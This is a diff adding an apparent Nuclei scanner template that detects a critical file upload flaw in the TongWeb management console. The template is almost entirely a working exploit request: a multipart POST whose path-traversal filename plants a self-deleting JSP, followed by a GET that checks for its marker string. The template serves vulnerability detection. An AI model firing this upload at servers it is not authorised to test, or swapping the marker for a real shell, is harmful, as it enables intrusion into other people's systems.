@@ -1,0 +1,52 @@
+id: tongweb-file-upload-vulnerability
+info:
+  name: TongWeb Upload Interface File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    TongWeb management console has a file upload vulnerability. Attackers can exploit this vulnerability to upload malicious files and potentially gain server permissions.
+  tags: file-upload
+  reference:
+    - http://www.tongtech.com
+
+variables:
+  cmd: "whoami"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/heimdall/deploy/upload?method=upload"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36"
+      Accept-Encoding: "gzip, deflate"
+      Accept: "*/*"
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs"
+    body: |
+      ------WebKitFormBoundary8UaANmWAgM4BqBSs
+      Content-Disposition: form-data; name="file"; filename="../../applications/console/css/12462332j12.jsp"
+
+      <% out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
+         new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+      ------WebKitFormBoundary8UaANmWAgM4BqBSs--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/console/css/12462332j12.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
